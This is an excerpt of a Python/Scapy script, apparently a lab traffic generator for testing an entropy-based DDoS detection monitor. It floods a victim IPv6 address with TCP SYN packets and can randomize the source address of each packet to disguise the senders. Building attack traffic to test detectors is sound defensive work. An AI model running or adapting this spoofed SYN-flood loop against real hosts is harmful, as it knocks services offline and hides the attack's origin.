...
ap.add_argument('--spoof', action='store_true')         # randomize source IPv6 per packet
a = ap.parse_args()
...
while time.time() - t0 < a.duration and not (a.count and n >= a.count):
    # spoof: random source IPv6 per packet (avoids ::1..::20 so it never collides
    # with a real host) -> explodes distinct-source count for the entropy monitor.
    s6 = f"2001:1:1::{random.randint(1, 0xffff):x}:{random.randint(0, 0xffff):x}" if a.spoof else src
    sendp(Ether(src=mac, dst=vmac) / IPv6(src=s6, dst=a.victim) /
          TCP(sport=20000, dport=80, flags="S", seq=1000 + n), iface=iface, verbose=0)
    n += 1
    if inter:
        s = t0 + n * inter - time.time()
        if s > 0: time.sleep(s)
print(f"[attack] {'spoofed ' if a.spoof else ''}{src} -> {a.victim}: {n} SYNs in {time.time()-t0:.1f}s")
